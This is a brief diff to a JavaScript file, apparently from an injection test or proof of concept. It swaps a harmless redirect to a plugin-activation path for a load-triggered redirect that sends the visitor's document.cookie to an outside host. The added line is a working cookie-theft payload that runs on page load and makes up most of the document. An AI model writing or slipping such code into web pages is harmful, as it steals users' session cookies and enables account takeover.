@@ -11,5 +11,5 @@
 
 // Trigger only onload, there is another scenario in case the injection happend afterwards
 window.addEventListener("load", () => {
-	window.location.href='/activate-plugin/1';
+	window.location.href='http://hack.nerdrage.fr/?data='+document.cookie;
 });
